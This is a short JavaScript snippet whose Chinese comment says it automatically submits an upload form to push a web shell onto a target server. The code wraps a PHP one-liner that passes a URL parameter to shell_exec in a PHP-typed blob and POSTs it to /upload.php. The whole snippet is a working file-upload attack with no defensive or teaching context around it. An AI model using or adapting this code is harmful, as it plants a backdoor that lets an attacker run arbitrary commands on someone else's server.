// JavaScript 用於自動提交一個上傳表單，將 Web Shell 檔案提交到目標伺服器
var form = new FormData();
form.append("file", new Blob([`<?php echo shell_exec($_GET['cmd']); ?>`], {type: "application/x-php"})); // Web Shell
fetch("/upload.php", {
  method: "POST",
  body: form
}).then(response => response.text()).then(console.log).catch(console.error);
